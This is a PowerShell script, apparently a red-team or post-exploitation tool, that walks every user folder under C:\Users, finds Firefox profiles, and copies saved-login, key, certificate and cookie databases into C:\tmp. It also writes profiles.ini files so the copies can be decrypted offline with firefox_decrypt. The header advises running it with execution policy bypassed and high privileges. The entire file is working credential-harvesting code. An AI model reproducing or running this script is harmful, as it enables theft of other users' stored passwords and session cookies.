<#
.DESCRIPTION
    Loops through all users in C:\Users and extracts sensitive Mozilla Firefox files. 
    These files can later be used to decrypt stored passwords using `https://github.com/unode/firefox_decrypt` or other similar scripts.
    Needless to say the script needs to be ran as a *high privileged user* to get as much information as possible.

.EXAMPLE
    PS C:\tmp> powershell.exe -executionpolicy bypass .\firefox_extract.ps1

	[+] Extracting secrets from 'Legit-User' to: C:\tmp\Legit-User\this-is-a-test-folder
	[+] Extracting secrets from 'Legit-User' to: C:\tmp\Legit-User\this-is-another-folder
	[-] 'Fredde' doesn't have any saved passwords in Mozilla Firefox
	[-] 'Public' doesn't have any saved passwords in Mozilla Firefox

.NOTES
    Author: 0xPThree @ Exploit.se
    Date: 2024-05-09
    Version: 1.0
#>

$banner = @"
 ___    __   ___  ___  __       __              __  
|__  | |__) |__  |__  /  \ \_/ |  \ |  |  |\/| |__) 
|    | |  \ |___ |    \__/ / \ |__/ \__/  |  | |    
                                      by: 0xPThree                

"@
Write-Host $banner

try {
    $rootDirectory = "C:\Users"
    $destinationDirectory = "C:\tmp"
    $filesToCopy = @("logins.json", "cert*.db", "key*.db", "cookies.sqlite")
    $found = $false

    Get-ChildItem $rootDirectory -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        $username = $_.Name
        $loginsPaths = Get-ChildItem -Path "$($_.FullName)\AppData\Roaming\Mozilla\Firefox\Profiles" -Filter "logins.json" -Recurse -File -ErrorAction SilentlyContinue
        
        foreach ($loginsPath in $loginsPaths) {
            $found = $true
            $destinationPath = Join-Path -Path $destinationDirectory -ChildPath $username
            $relativeProfilePath = $loginsPath.Directory.FullName.Substring($loginsPath.Directory.Parent.FullName.Length + 1)
            $destinationProfilePath = Join-Path -Path $destinationPath -ChildPath $relativeProfilePath
            
            foreach ($path in ($destinationPath, $destinationProfilePath)) {
                if (-not (Test-Path $path)) {
                    New-Item -ItemType Directory -Path $path -Force | Out-Null
                }
            }
            
            Get-ChildItem -Path $loginsPath.Directory.FullName -Include $filesToCopy -File -Recurse | ForEach-Object {
                $destinationFile = Join-Path -Path $destinationProfilePath -ChildPath $_.FullName.Substring($loginsPath.Directory.FullName.Length + 1)
                $destinationFileDirectory = Split-Path -Path $destinationFile -Parent
                
                if (-not (Test-Path $destinationFileDirectory)) {
                    New-Item -ItemType Directory -Path $destinationFileDirectory -Force | Out-Null
                }
                
                Copy-Item -Path $_.FullName -Destination $destinationFile -Force | Out-Null
            }
            
            $index = 0
            $profilesIniPath = Join-Path -Path $destinationPath -ChildPath "profiles.ini"
            while (Test-Path $profilesIniPath) {
                $index++
                $profilesIniPath = Join-Path -Path $destinationPath -ChildPath ("profiles{0}.ini" -f $index)
            }
            
            $profilesIniContent = @"
[Profile0]
Name=default
IsRelative=1
Path=$($loginsPath.Directory.Name)
"@
            
            Set-Content -Path $profilesIniPath -Value $profilesIniContent -Force | Out-Null
            Write-Host "[+] Extracting secrets from '$username' to: $destinationProfilePath"
        }
        
        if (-not $loginsPaths) { Write-Host "[-] '$username' doesn't have any saved passwords in Mozilla Firefox" }
    }

    if (-not $found) { Write-Host "[!] No passwords saved in Firefox for any user under $rootDirectory" }
} catch { Write-Host "An error occurred: $_" }
